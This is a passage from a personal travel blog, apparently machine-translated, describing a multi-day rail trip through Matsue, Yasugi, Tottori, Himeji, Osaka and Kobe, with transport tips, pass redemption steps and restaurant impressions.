luggage at the hotel, then take the bus from Songjiang Bus Station to the Songjiang Castle cruise.Google Maps does not show the platform; you can only see it on-site. Trains at platform 2 go to Songjiangcheng.Get off in front of the County Civic Hall and walk towards Songjiang Castle. You can see the ‚ÄúHorikawa Sightseeing Boat‚Äù boarding area near the parking lot.Activate the JR Pass San‚Äôin San‚Äôy≈ç Area Pass 3-Day Ticket Free ride on the Horikawa Sightseeing Boat Download Discover Another Japan App Copy the serial number from the certificate email Open the app, select ‚ÄúInput,‚Äù paste the serial number, and press ‚ÄúActivate.‚Äù Switch to ‚ÄúUse‚Äù to fill out the health questionnaire. After completing it, a QR Code camera will appear; scan the QR Code provided by the store and show them the result to complete the redemption.You can also click ‚ÄúTarget Content‚Äù to view redeemable items. The actual calculation time starts from the first time the target is redeemed , not from when the serial number is activated (I entered it on 11/13).Here are some popular locations you can use: Shinji Lake Sightseeing Boat, original price 1,800 yen Matsue Castle Boat Tour, original price 1,600 yen Adachi Museum of Art, original price 2,300 yen Matsue Castle, original price 680 yen Tottori Sand Dunes Museum of Art, original price 800 yen Tsutenkaku Tower, original price 800 yen Okayama Korakuen, original price 410 yen It‚Äôs really a great deal. Just adding up the above savings amounts to 8,390 yen, which is already half the price of the entire JR Pass.09:15 Take the Songjiang Tour BoatDirectly redeem and ride for free with the 3-Day Tour Pass. This year is warmer, so the kotatsu boat hasn‚Äôt been turned on yet. There are four bridges where the boat must lower its body. Be careful not to get your hands caught. About 50 minutes in total Please take off your shoes before boarding ‚ö†Ô∏è Only the right row facing the boatman can directly see the view of Songjiang City. The farther from the boatman, the closer to the bow (= the first row just inside) ‚ö†Ô∏è As shown in the picture below Boarding the ship.It might be because the maple leaf season hasn‚Äôt started yet, so there aren‚Äôt many people. There were only four people on the boat, making it very spacious.There are four bridges that lower the ship‚Äôs deck when passing underneath, so you need to bend down slightly to pass through.Cruising along the river with the wind is very pleasant, and the boatman also introduces the surrounding sights and history along the way (although I only understood ‚Äúhidari‚Äù for left and ‚Äúmigi‚Äù for right‚Ä¶).https://youtube.com/shorts/KA9xKZV16bkNear the end, close to the return point, there is a Matsue Castle photo spot where you can capture a distant view of Matsue Castle.The boat tour ends around 10:00.10:15 Matsue CastleThe direction back from the boat leads to the entrance of Matsue Castle on the other side. Walking uphill will take you to Matsue Castle.Passing by Matsue Shrine, we arrive at Matsue Castle.Due to limited time, I decided to continue on to the Adachi Museum of Art and did not go up.Wait for the bus going back at the bus stop in front of the Prefectural Citizens‚Äô Hall, opposite to the direction you came from.~=10:30 Return to the hotel to pick up luggageAround 10:30, return to Songjiang Station and go back to the hotel to pick up your luggage. Almost got hit by a bike with brake failure while waiting at the traffic light here. Luckily, I was standing further back and avoided it. Always be careful when you‚Äôre out. ‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏èAfter arriving at the station, also reserve a seat on Yakumo 14 bound for Yasugi (ÂÆâÊù•) (Adachi Museum of Art).11:03 Head to Anlai11:03 Departure time, bought some food near the station to eat on the bus. Goodbye, Songjiang.The waffles and the savory roasted chicken are both very delicious.11:12 Arrived at Anlai StationDon‚Äôt rush to exit the station at Yasugi Station. Find the tourist information center to store large luggage.(There are coin lockers outside the station, but they are often full.)11:30 Take the shuttle bus to Adachi Museum of ArtFor the latest timetable, please refer to the official websiteAfter placing the luggage, take the shuttle bus to Adachi Museum of Art (free, board in order while queuing). There were not many people when I came in the morning.Walk through the rural alleys for about 20 minutes to reach the Adachi Museum of Art.After getting off, walk straight ahead to reach the entrance of the Adachi Museum of Art.Similarly, use the 3-Day Pass to redeem free admission.The first step is to collect a ‚Äúshuttle bus ticket‚Äù at the front desk before the entrance according to your schedule, one ticket per person; when the time comes, return to the drop-off point and use the ticket to take the shuttle back to Anlai Station.My itinerary is to take the JR departing from Yasugi at 14:46 heading to Tottori. Please note there are not many trains going to Tottori‚ö†Ô∏è. Very important! Very important! Very important! Be sure to get it, or there‚Äôs no guarantee of a seat on the bus. ‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è I was the one who didn‚Äôt know I needed a ticket. I was supposed to take the 13:00 train but realized I needed a ticket, so I went back to get it and took the 13:35 train back to Anlai. Fortunately, I gave myself plenty of time.Adachi Museum of Art ‚Äî Japan‚Äôs Top GardenYou can quietly sit here and enjoy the courtyard view.Besides the garden, the core of the Adachi Museum of Art is its many art collections. Photography is prohibited. Follow the route to view the artworks and the garden.You can see part of the courtyard landscape outside, which clearly shows that a lot of time and effort has been spent maintaining this design.There are two cafes inside, offering not only desserts and coffee but also savory dishes; feel free to stop by, rest, have a bite, and enjoy the view. Since I was alone, I didn‚Äôt particularly stop to eat.Bought a cardboard reproduction of a museum painting seen at the souvenir shop: Yokoyama Taikan ‚ÄúMt.Fuji‚Äù painting as a keepsake.12:30 Stroll around the outdoor shopping streetThere is a small shopping street outside. Since it was still early, I wandered around there first. This Shimane Wagyu rice burger is quite bad. It‚Äôs just a microwaved rice burger with sticky rice, and the Wagyu in the middle I ate was still cold and not fully heated‚Ä¶As mentioned earlier, I didn‚Äôt know I needed a ticket at first and foolishly waited for the bus. It wasn‚Äôt until 1:00 PM that I realized I couldn‚Äôt board and then went to get a ticket for 1:35 PM.Hold the full ticket and re-enter (re-entry allowed). Sit in the original indoor viewing area to relax, enjoy the view, and wait for the bus.13:55 Return to Yasugi StationOn the way back to Anlai Station, I saw very bright red maple leaves.At this time, there are actually more people visiting the Adachi Museum of Art.This station isn‚Äôt crowded, and it‚Äôs still early, so I took the chance to record a short video demonstrating how to reserve a seat with the JR Pass. Watch here.Shimane CatWandering around the tourist information center to kill time.Arriving here, Kiyomizu-dera also feels like a hidden spot for enjoying autumn leaves.14:46 Take the limited express train to TottoriThe train model is very old and only has two cars (one free seating, one reserved seating). My 26-inch suitcase couldn‚Äôt fit in the overhead luggage rack (newer JR trains can, but this model‚Äôs rack is too small). I forgot that I could walk to the last row and place it behind the last seat, so I had to squeeze it into my own seat area.Fortunately, there was no one next to me the whole way. The unreserved cars seemed more crowded, while the reserved seats here were only about 60% full. Due to the itinerary, I did not specifically visit GeGeGe no Kitaro Station (Sakaiminato Station) or Conan Station (Yura Station).SourceSource Interested friends can plan to visit more.15:58 Arrive at JR Tottori StationHead to tonight‚Äôs hotel Toyoko INN Tottori Station South Exit. There is also a Toyoko INN at the North Exit, but I couldn‚Äôt book there. The North Exit area has a livelier shopping street.17:00 Wandering Around TottoriThere is still an hour before mealtime, so I‚Äôll first visit the nearby AEON for a walk.Around 18:00, I walked to the area near Tottori North Exit Shopping Street to find food. I had been eating randomly for the past few days, so today I wanted to find a better restaurant.I found a Tottori Wagyu restaurant with good reviews on the main street ‚Äî ‚ÄúNiku Ryori Nick‚Äù to try Tottori Wagyu. Not sure if it‚Äôs a weekday, but I was the only one there. Tottori Wagyu is not as famous as Kobe or Omi beef, but Tottori is the birthplace of Japanese Wagyu culture.I ordered the ‚ÄúTottori Wagyu Hitsumabushi‚Äù Tottori Wagyu three-way rice for 3,500 yen, which is much cheaper than Kobe beef.Tottori Wagyu is very tender but has less beefy flavor. At first, eating pure Wagyu doesn‚Äôt have much taste.Second and third servings, combined with the included soup, make for a delicious ochazuke.18:30 Return to the station and hotel after eatingOn the way, buy a ticket for the next day‚Äôs trip to Himeji.Bought late-night snacks on the way back to the hotel to eat at night, also got Y1000 Yakult 1000. This time, I didn‚Äôt really drink much but still slept well‚Ä¶ Good night, Tottori.Day 4 (11/15 Friday) White Rabbit Shrine, Tottori Sand Dunes, HimejiIn the morning, first visit the White Rabbit Shrine (for matchmaking) to pray. Return to the north exit of Tottori Station and walk towards the bus terminal. Pass through the bus hall and wait at platform 4 at the back for the bus.Take bus 41 from Shiratama Coastline Shikae Office to Shiratama Shrine Front according to Google Maps. Buses in Tottori do not accept electronic payments; cash only Buses in Tottori do not accept electronic payments; cash only Buses in Tottori do not accept electronic payments; cash only Please prepare small change in advance, or exchange a thousand-dollar bill for change next to the driver. ‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è The fare is about 610 yen.Or buy a one-day sightseeing pass at Tottori Station first for better value.Before getting off, insert coins according to the amount shown on the screen. Since we boarded at the last stop without a ticket, we paid the amount shown one step before the first slot.~= 09:30 Arrive at Shirahige ShrineAfter getting off, walk back towards the pedestrian bridge to reach the entrance of the White Rabbit Shrine. The White Rabbit Shrine originates from the legend of the ‚ÄúWhite Rabbit of Inaba.‚Äù According to the legend, Okuninushi (from Izumo Taisha) helped an injured white rabbit recover, received its blessing, and successfully won the love of Princess Yakami-hime. The White Rabbit Shrine symbolizes good relationships and healing. Both shrines share the sacred meaning of praying for happiness and connections.The shrine is not far away, but along the way, there are many rabbit statues, all piled with love stones. Izumo Taisha also has many statues of the Inaba White Rabbit, but I forgot to take photos.The torii gates are also piled with matchmaking stones.The shrine is not very large and can be visited in about 15‚Äì20 minutes.Also spent 500 yen to buy a matchmaking stone to place at the statue.My Purchase of Inaba‚Äôs White Rabbit: Left: Bought at a gift shop outside Izumo Taisha Shrine Right side: Bought at the White Rabbit Shrine (includes a poetry fortune slip) The story of the White Rabbit of Inaba and the Great Deity Okuninushi.~= 09:50 White Rabbit Shrine Tourist Information Center, White Rabbit BeachThere really is a white rabbit kept inside the tourist information center. They also sell some snacks and souvenirs. I bought a bread to fill my stomach.White Rabbit Beach is very desolate.The bus to Tottori Station doesn‚Äôt come until 10:45. It‚Äôs better to arrive earlier and take an earlier bus to save time.from: Sheng Wei Remember to take a ticket when boarding; it has a number. When getting off, insert the corresponding amount of coins along with the ticket based on the number. ‚ö†Ô∏èOn the bus, I met a tourist from Fujian, China. His itinerary was the opposite of mine; he was going to Himeji first, then Shimane. We exchanged recommendations: he suggested visiting Shoshazan Engyo-ji Temple before Himeji Castle, and recommended taking photos at the spot shown in the picture near Himeji Castle. Thanks to him! In the end, it was definitely worth it.Get off at Aioicho, then transfer at the opposite bus stop to a bus heading toward Tottori Sand Dunes.The bus I took stops at the east entrance of the sand dunes, where I got off and walked up. Take ticket number 3 when boarding. When getting off, check the screen for the amount corresponding to number 3 and insert the coins. In this example, you need to pay 250 yen.My Confusing Tour Route.After getting off, turn back at the fork and follow the signs uphill, passing the Tottori Sand Dunes Museum, and continue walking to the entrance of the Tottori Sand Dunes. Prohibited activities in Tottori Sand Dunes, especially drawing on the sand that harms nature. ‚ö†Ô∏èThe Tottori Sand Dunes are really vast. The sky was a bit overcast and rainy at the time, but if it were sunny, it would probably be very hot.~=12:00 Arrive at Tottori Sand DunesJapan‚Äôs largest sand dune.People look very small. Walking up to the dune ridge, I felt a bit shaky, and the loose sand made it hard to walk.At the highest point, you can overlook the entire coastline. The scene of sand dunes at your back and the sea in front is unique to this place.According to online information, camel riding is usually available, but today it seems unavailable due to bad weather.Looking back one last time at the Tottori Sand Dunes, they really are huge; some sand inevitably got into my shoes, I saw someone cleverly wearing plastic shoe covers directly.You can take the cable car directly to the Tottori Sand Dunes Observatory. I planned to go there first but decided to try the famous Tottori No.1 Sand Dune pudding downstairs, so I didn‚Äôt take the cable car. Later, I walked up since it was on the way and not far (~15 minutes only).Coming out from the parking lot, you can see the Tottori Sand Dunes ‚ÄúTakahama Cafe È´òÊø±ÂíñÂï°Âª≥‚Äù designed by Kengo Kuma across the street.Bought one to try, the taste is really good. The pudding has a rich milk flavor and a texture similar to custard.The specialty is that they give you a small packet of sugar that looks like sand, which you add and eat together.There are some restaurants along the road where you can eat. Continuing back, there is a small path; walk up a short distance, and on the right is the second entrance to the Sand Dunes Art Museum. On the left, a bit further up, is the ‚ÄúTottori Sand Dunes Observatory,‚Äù where the cable car arrives.First, head left to the Tottori Sand Dunes Observatory to enjoy the view and have some food. You will arrive at the cable car boarding area first.You can first go to the vending area and nearby to get a brush to clean the sand off your shoes. (The staff at the entrance will also remind you)Finally, I waited here for the bus back to Tottori.The first and second floors of the observation deck sell souvenirs and have a small restaurant. The third floor offers a view of the Tottori Sand Dunes (though there‚Äôs not much to see).There aren‚Äôt many food options inside. You need to first buy the corresponding meal ticket from the nearby vending machine, then enter, find a seat, and hand the ticket to the staff.Just had an oyster set meal.Also bought some Tottori souvenirs here.13:30 Dune Art MuseumAfter eating, head down from Entrance No. 2 to visit the Sand Dunes Art Museum. (Also free admission with the 3-Day Pass)Starting from Entrance No. 2, the visit begins with the sand sculptures outside, then continues down from the 3rd floor to the 2nd floor. Inside the venue, only the 2nd floor has sand sculptures. The venue is small, and if it weren‚Äôt free, I probably wouldn‚Äôt have entered.Although the venue is small, each sand sculpture is detailed and exquisite.There is also a silly QR code for the Dune Art Museum that you can scan.After walking around, I went back up to the Tottori Sand Dunes Observatory. I wandered around and ate a Tottori pear ice cream. Around 14:20, I waited at the bus stop and caught the 14:42 bus heading to Tottori Station. The bus returning to Tottori was already nearly full when it arrived, so I barely managed to squeeze on. If you have time, it might be better to board at the previous stop.2025/01 UpdateI only saw after returning that Tottori offers taxi charter one-day tours due to less convenient transportation. For details, please refer to the visitor center or this website.15:10 Return to Tottori StationAround 15:10, we returned to Tottori Station, and it started to rain.Wandering around the shops at the station, the souvenir store here also sells Dune pudding!I originally planned to visit Tottori‚Äôs famous „Åô„Å™„Å∞ÁèàÁê≤ (Sunaba Coffee), but they were already closed after 3 PM. So I found a nana‚Äôs green tea inside the station to have some dessert and coffee to rest and recharge (both myself and my phone needed charging).The store is comfortable and not crowded.Warabi mochi + ice cream + hot coffee, very satisfying.16:15 Return to the hotel to pick up luggage, then go back to the station to wait for the trainThe time is still early; we will take the 16:55 Limited Express Super Hakuto to Himeji.Saw the Conan train while waiting for the bus.16:55 Board the bus to Himeji Goodbye, San‚Äôin.Booked a front-row seat in the Green Car, very comfortable. Because the car was shaking a lot, I didn‚Äôt dare to put the luggage on top. Instead, I went to the last row of seats and placed it sideways behind the last row.18:27 Arrive at Himeji StationIt happened to be their councilor election, and outside the venue, a councilor was giving a campaign speech with a large crowd.After exiting the station, go directly to the hotel Toyoko INN Himeji Station Shinkansen North Exit. The last three nights were all spent here. The Toyoko INN near the north exit is livelier; it looks close on the map, but it actually feels a bit farther, taking about 10 minutes to walk.The room assigned on the 14th floor rooftop has a great view outside the window.You can directly look back at Himeji Station railway from the window. Trains passing by make slight track noises, but fortunately, there are no trains after night.19:00 Go out for a casual food huntWhen I first saw the night view of Himeji Castle, I thought it was beautiful. For some reason, I decided to walk to Himeji Castle to take night photos. Being too close made it hard to frame good shots, so I didn‚Äôt take many pictures and left quickly. It was cold and I was hungry the whole way. I should have just gone straight to eat.Himeji Castle is about 1 kilometer from the station, and it took nearly 30 minutes to walk round trip.https://himeji-kyoukasuigetsu.com/en/https://himeji-kyoukasuigetsu.com/en/ Unfortunately, I missed the Himeji Castle winter illumination event this time. It looked beautiful and romantic. I‚Äôll try to visit again when I have the chance. The event starts on Friday, November 22, 2024, and runs until Sunday, February 23, 2025.Finally, I found that the viewing platform on the second floor of the station‚Äôs north exit is the best spot to photograph Himeji Castle.Before buying dinner, I took a short walk and tried some capsule toys at the department store Piole Himeji near Himeji Station.~=20:00 Buy dinner and go backWalk from the second-floor skybridge to the adjacent TERASSO and find a yakiniku restaurant that is still open to take out a yakiniku bento to eat back at the hotel.Stopped by a convenience store and bought some food and drinks.After eating and drinking, taking a shower, I went downstairs to do laundry. This time, knowing that Toyoko requires you to bring your own detergent, I first bought washing powder with coins and put it in the washing machine along with my clothes. The dryer here is very new and high-end, and you can even choose the temperature. Good night, Himeji.Day 5 (11/16 Saturday) Writing at San‚Äôenky≈çji Temple, Himeji Castle, Shopping Around HimejiEvery Toyoko INN offers free breakfast, but I usually just grab some convenience store bread and coffee I bought the night before to save time in the morning.08:45 Leave the houseAt 8:45 AM, left the hotel and crossed the deserted shopping street to the station.08:55 Take the bus to Shoshu-san Enkyo-ji TempleHimeji Station has several platforms. Google Maps does not specify which platform or bus number to take, so you need to follow the signs on site. Take bus number 10 from platform 10, the Êó• Âß´Ë∑ØÈßÖÂåó„ÄúÊõ∏ÂÜôÂ±±„É≠„Éº„Éó„Ç¶„Çß„Ç§ route. Shosan-en Temple was a filming location for the movie The Last Samurai:https://visit-himeji.com/zh-hant/trip-ideas/featured-in-the-last-samurai-shoshazan-engyoji-temple-in-himeji/~=09:20 Arrive at the Shoshozan Ropeway Boarding AreaAfter getting off, you will find the cable car boarding area. After buying a round-trip ticket at the ticket machine, you can line up to wait for the cable car. (Runs every 15 minutes)Shosaku Mountain will have special night openings from 11/15 to 11/17, open until 8:00 PM, and the cable car hours are extended to 8:30 PM.09:30 Take the cable car up the mountain09:35 Arrive at the entrance of Shoshu-san Enkyoji TempleTickets are required for entry. At that time, I didn‚Äôt check carefully and only bought the regular mountain entry fee, which does not include round-trip shuttle service, so you have to walk up the mountain. ‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è About a 5-minute drive Hiking time: about 20 minutes (1 KM) If I had to choose again, I would pay an extra 500 yen to save time and energy.Fortunately, it was early in the morning, so I still had plenty of energy and spirit. The slope was gentle, so I walked up the mountain while enjoying the autumn leaves.About 400 meters remain after passing through the Niomon Gate.09:55 Arrive at Moni HallShoshan Enkyoji Temple covers a vast area; I think it takes at least 2 hours to walk through the entire site.I only visited the Mani Hall and the Great Lecture Hall before turning back down the mountain.You can take off your shoes and enter the Mani Hall to pray, and you can also view the maple leaves from here.It is very quiet and peaceful, but this year‚Äôs maple leaves turned red later, with only a few scattered trees changing color.Walk forward from the rear alley toward the main auditorium.The lecture hall features an installation art piece by Engy≈ç-ji Temple x Kengo Kuma, on display until 12/1.The maple leaves next to the lecture hall are very red. When I arrived at the main hall, a sutra chanting was in progress. Visitors can take off their shoes and enter to pay respects. The Japanese monks chant differently from those in Taiwan; they unfold the entire scripture, chant along, then fold it back and clap at the end.You can also visit the nearby canteen, which displays many historical artifacts.All the buildings are historical monuments (built in 1282). Walking on them gives a sense of traveling through history, and the overall architecture is well preserved and maintained.View of the main auditorium from the second floor of the cafeteria.After visiting the main auditorium, I returned to the Mani Hall and bought a freshly baked red bean mochi at the shop outside to recharge. (Freshly baked and delicious, with a crispy skin)Have a safe trip home.After eating, spend another 20 minutes walking downhill back to the entrance of Shina Lodge.~=10:55 Take the cable car down the mountain11:10 Return to Himeji City CenterThe bus stop when walking back down the mountain, around 11:05, waiting for the 11:10 bus back to Himeji city center.~= 11:35 Arrive at Himeji CastleAfter getting off the bus, walk a little forward to reach the Himeji Castle boat tour. However, the weather was gloomy and it looked like rain, so I didn‚Äôt go.Walking into Himeji Castle, the bridge scenery at the entrance is great for photos!The Sannomaru Plaza in front of Himeji Castle is very large. From here, it takes another 5 minutes to reach the castle entrance.I decided to first visit the Himeji Castle photo spot recommended by a passerby yesterday. The spot is in the opposite direction of the castle entrance, inside the ‚ÄúHimeji City Zoo‚Äù on the right side.According to the promotion, there is a capybara on the right side, but it might not be out due to the cold. After entering, go straight across the bridge, turn right after seeing the Ferris wheel, and behind it, there is an open space which is the photo spot.https://youtube.com/shorts/XDquPOanhpQThe shooting spot has a great view, but unfortunately, there are no cherry blossoms or maple leaves to complement it. After filming, I walked around the zoo a bit. The facilities are very old (amusement rides cost extra), animal spaces are cramped, many animals look depressed and display stereotypic behaviors, hard to watch, so I left shortly after.After filming Himeji Castle, walk back to the left-side entrance to visit inside the castle.After buying the ticket, follow the tour route straight into the city.After entering indoors, you also need to take off your shoes. A plastic bag will be provided to store them.Looking back at Himeji Station from the second floor, there are six floors in total. The higher you go, the smaller the floors and the steeper the stairs, requiring you to queue to go up. It was almost 12:30 PM, and I was very hungry. I also forgot to bring a power bank today, so my phone was nearly out of battery. Seeing the long line of people waiting, I decided not to keep climbing and turned back at the second level to leave the city.After leaving the city, walk all the way back to San-no-maru Plaza, then exit outside.Kushiyaki Kobe beefOutside Himeji Castle, I found a shop selling Kobe beef in the shopping street. I took away Kobe beef rice bowl and skewers to the hotel to rest and recharge.13:20 Return to hotel to restBad weather + morning hike + dead phone = back to the hotel to rest.Except for the portion being a bit small, the Kobe beef here tastes quite good.15:30 Shopping near Himeji StationRested until about 15:30 and went out again.There isn‚Äôt much to shop around Himeji Station. There are only the Piole mall at the station, the department store in the SANYO Electric Railway building, and a nearby shopping street. There is no Don Quijote or McDonald‚Äôs, only one Lawson, and just one Matsumoto Kiyoshi drugstore.On the third floor of Piole, Kiddy Land has some GiiKawa figures. There aren‚Äôt many people here, so no need to queue. I took three babies home, but couldn‚Äôt get the Usagi pajamas version QQ.Strolling through the shopping street, looking for a capsule toy (gacha) spot.Although I just said there‚Äôs not much to shop for, at least there are gacha shops and Animate.It started raining heavily near evening. Fortunately, there were no special plans scheduled for today.~=18:00 Dinner„Åä„Å†„Åó„Å®„ÉØ„Ç§„É≥„Å®„ÅäÊñôÁêÜ„Å®„ÄÇmottoChose a random shop in the shopping street that serves Kobe beef for dinner.The highlight here is an appetizer shaped like a lucky cat and a dessert that isn‚Äôt too sweet, which is quite good.Ordered Kobe beef steak, ochazuke, and draft beer.The Kobe beef here was just average, a bit tough to chew, and lacked the distinct Kobe beef flavor. However, the ochazuke (tea poured over rice) was quite tasty.After eating, take a casual stroll around Himeji after the rain.~=20:00 Return to the hotel to rest &amp; watch the Taiwan-Japan gameFrom a Japanese perspective, the broadcast content is completely incomprehensible, but the Japanese broadcast provides very detailed information. On the left, there is additional baseball knowledge, and on the right, a full analysis of the pitch types.The final match was won by Japan. Good night, Himeji.Day 6 (11/17 Sunday) Osaka, KobeOriginally planned to visit Naruto Whirlpools and Akashi Kaiky≈ç Bridge, but due to bad weather, we changed to shopping in Osaka and Kobe.~= 08:45 Take the Shinkansen non-reserved seat to Shin-OsakaTaking the Shinkansen to Shin-Osaka (25 minutes) and then transferring to the Midosuji Line to Osaka takes about the same time as taking a regular train directly to Osaka. Since there are many Shinkansen departures, I chose the more comfortable Shinkansen where I can also charge my devices.9:17 Arrive at Shin-OsakaAfter arriving at Shin-Osaka, you still need to walk to the Midosuji Line.First, visit Namba Yasaka Shrine in Kansai, which was missed last year.After getting off at Namba Station, walk a short distance and the shrine is located in an alley. Just realized Osaka is also testing facial recognition for station entry and exit.~=9:50 Arrive at Namba Yasaka ShrineThe shrine is small and crowded with tourists. People usually just take a few photos and leave.After leaving, continue to the next station ‚ÄúDaikokucho,‚Äù take one stop to ‚ÄúDobutsuen-mae,‚Äù and get off to head to Tsutenkaku.Exit the station, pass through the underground passage and shopping street, then continue straight to see Tsutenkaku Tower. The security here feels quite chaotic. Right after exiting the station and passing through the underpass, there are many homeless people, and some are arguing loudly, which is a bit scary.The shopping street alley is narrow with food on both sides. A few places seem to be popular spots with long lines and many people.Around 10:30, I arrived at the base of Tsutenkaku. There was a long queue of people waiting to go up, so I gave up immediately.Walk back to the subway station to return to Osaka.~=11:00 Return to Osaka UmedaBefore leaving, visit LINKS Department Store. The fifth floor connects directly to the Yodobashi Gachapon Toy Area.After visiting LINKS, walk through Osaka Station and the Time Square upstairs to reach Daimaru Department Store Osaka directly.On the 13th floor, there is a Pok√©mon Center, Nintendo Osaka, CAPCOM‚Ä¶Checked out some Zelda merchandise, already bought a lot last time, so this time I left without buying anything.Passing by the Hanshin Tigers merchandise store.Getting ready to eat at Shake Shack. I had it in Bangkok in July and still crave it Unforgettable; now enjoying it again in Osaka.~=12:00 Shake ShackShake Shack Hanshin Umeda Store is right next to the Hanshin Tigers shop.Ordered through self-service; this time had the avocado bacon chicken burger and a milkshake. The place is quite spacious with plenty of seating.Osaka StationAfter eating, I wandered around near Osaka Station and decided to visit Osaka‚Äôs Kiddy Land to look for Jiji Kawa.Got lost in Osaka underground shopping street, walked for a long time before finding Hankyu Sanbangai. Then took the underground passage from the South Building to the North Building, and the food court is right above.Jiikawa has set up an independent booth on the other side.13:00 Kiddy Land Osaka ChiikawaThere are quite a few people in line, and it‚Äôs estimated that the wait will be at least 40 minutes. Obviously, I didn‚Äôt spend time waiting in line.There is a Kumamon event on the first floor.It might be because of the holiday, but there are more events. Outside Kiddy Land, there is also a Kanahei photo event. (Another Usagi XD)13:20 Head to KobeGot a bit lost in the underground mall before finally finding Osaka Umeda subway station. Took the Hankyu Kobe Line to Kobe Sannomiya (Hankyu).13:50 Arrive at KobeIt‚Äôs still early, so I plan to go to Kobe Animal Kingdom to see the capybaras first.Google Map asked me to take the ‚ÄúNew Transit Harbor Artificial Island Line,‚Äù but I wandered around the underground mall for a long time and couldn‚Äôt find the corresponding signs. (Lost Day)I only realized after exiting that this is the one flying in the sky, entering from the second floor of Sangu Station.The station was crowded, and I later found out that today happened to be the Kobe Marathon.Lost Day‚Ä¶ Because the bus arrived just then and I didn‚Äôt look carefully, I got on the wrong bus heading to the North Pier. The tragedy started from that moment. To go to Kobe Animal Kingdom, take the route toward Kobe Airport. The route toward North Wharf will turn back at North Wharf and return to Kobe. ‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏èKobe Marathon has road closures and runs on the elevated highway. This subway line, like Taipei Metro‚Äôs Wenhu Line, is an early rubber-tired metro.14:20 Realized I was on the wrong bus, got off at ZhongbutouI sensed something was off here and got off immediately. Google Maps suggested I walk back to Civic Plaza Station to catch the next train.It might be because this is a reclaimed port area, which feels very desolate and the walk seems long.Walking quickly to the Civic Square Station, I wondered why it was so lively. It turned out to be the finish line event venue for the Kobe Marathon. Tragedy 2: This station is closed due to overcrowding. You need to continue forward to South Park Station.Walked to South Park Station, just one more stop to go, but too lazy to take the subway, so I walked straight to Kobe Animal Kingdom‚Ä¶As mentioned before, it feels very remote and indeed is far. Walking from the central pier is 2 kilometers (about 30 minutes).14:50 Arrive at Kobe Animal KingdomTicket price: 2,200 yenShoebill, Masked Palm Civet, Red PandaAlthough Kobe Animal Kingdom is partly indoors and partly outdoors, its layout is well planned. It has various birds and animals, most of which can be approached closely. It‚Äôs great for families to spend half a day here. The animals are in much better condition compared to Himeji City Zoo, and the environment is very clean.CapybaraThe purpose of coming here is achieved: to touch the capybara. It‚Äôs so fat, and its fur feels rough like a broom.Each one looks so lazy; not having to work is great!Possibly due to being overweight, food is no longer sold for feeding inside the venue, and feeding outside food or placing items on its head is prohibited.In another area, you can interact closely with kangaroos and sheep.Remember to wash your hands before and after touching.There is also a seal, but the space looks too small, so it keeps swimming in circles QQPenguin Feeding (Requires a numbered ticket).The adorable little clawed otter family keeps chirping.There is a Malayan tapir here with the otters, but it‚Äôs mostly ignored QQToucan and owl, along with pheasants that appear near your feet. (Be careful not to step on them ‚ö†Ô∏è)King Julian with pelicans that eat colleagues, and also nocturnal barn owlsIndoors, there is also an interactive area with rabbits, cats, and dogs (tickets required), as well as food and souvenir shops, and more.Overall, the experience was quite good!15:50 Leave, prepare to return to KobeMainly came to see the capybaras, and didn‚Äôt stay long due to limited time.~= 16:05 Arrive at (Kobe) Sannomiya StationDue to the Kobe Marathon, many people are exiting the station.There is still over an hour before mealtime, so first, I‚Äôll stroll around near Kobe Sannomiya, looking for capsule toys and Kiddy Land as usual.Kobe‚Äôs Kiddy Land had few people, but there were very few Gudetama products, and I couldn‚Äôt find the Usagi pajamas I wanted.Center Plaza is a bit old but has many shops to explore.Go to the second floor to look for capsule toys and check the secondhand store to see if they have the Usagi I want.There is a Nobunaga bookstore where you can buy omamori (amulets) to give to friends, hehe.~=17:00 Kobe Beef Kissho KichiB1 has a Kobe Beef restaurant called Kichijoji. We arrived for dinner almost at 5 PM.It was still early, and there were few people; the owner was very enthusiastic when he heard I was from Taiwan. This meal was also the purpose of coming to Kobe: to have a good meal ‚Äî Kobe beef, since I had been eating randomly for the past few days.I ordered the ‚ÄúKobe Lean Beef Steak 220g‚Äù for 7,700 yen (pre-tax ‚ö†Ô∏è, tax included at checkout), with a set meal (lettuce, rice, soup) and draft beer.The lettuce is fresh and crisp, and the soup is beef broth, very tasty.The meat is tender, juicy, and flavorful. Compared to the Kobe beef I had yesterday, this is the true taste of Kobe beef. But to be honest, I still prefer teppan dishes over Western-style food.Final actual charge: $2,158 TWD.17:40 Finished eating and left, heading to Kobe TowerAfter eating, walk to the old foreign settlement along the coastline and Daimaru-mae Station. Take one stop and then walk to Kobe Tower.Kobe is very lively (compared to Himeji) with many department stores to shop at.Take the train toward Shin-Nagata and get off at the next stop, Minato Motomachi.18:05 Arrive around Kobe TowerWhen I came last year, it was under maintenance, but it is now fully open.Kobe Port has a strong harbor town vibe. If I get the chance, I would consider staying overnight in Kobe.This time, I just took a quick look around and left.18:30 Return to Kobe ChinatownOn the way back to Kobe Station, first stop by Chinatown to buy Kobe Frantz chocolate souvenirs.Return to JR Motomachi StationPlease note it is JR Motomachi Station, not Hanshin Electric Railway Motomachi Station.18:53 Take the Rapid train towards Himeji, from Aboshi to Kobe (Hyogo)18:57 Transfer on the same platform to the other side Rapid Service via Aboshi on the Kosei Line Transfer quickly, arrive in 20 minutes Luckily, I made the transfer just in time to reach Himeji‚Äôs only drugstore, Matsumoto Kiyoshi, before the tax-free hours ended.This train model requires pressing the door button beside the door to open it, and the carriages are separated from each other.19:34 Arrived at Himeji19:45 Arrive at Himeji Piole, shop for drugstore items at Matsumoto Kiyoshi Please note that although the business hours are until 21:00, the tax-free service ends at 20:30. ‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏èBought a super mini Cup NoodleOn the last night in Japan, eating and drinking late-night snacks and beer at the hotel. (These dumplings have a soft texture‚Ä¶) Good night, Himeji.Day 7 (11/18 Monday) Okayama, Return Trip08:30 Good morning, HimejiA final glance at Himeji‚Äôs morning.At the Shinkansen station, preparing to board the 08:52 Shinkansen bound for Okayama.Take the 08:52 Shinkansen non-reserved seat to Okayama09:13 Arrive at Okayama StationIt takes about 21 minutes by Shinkansen to reach Okayama Station. Unfortunately, there isn‚Äôt enough time this trip to visit Hiroshima again.Same as last time, go directly to the west exit of Okayama Station to catch the airport bus. There are lockers here to store luggage and restrooms (at this time, the department stores are not open and there are few restrooms 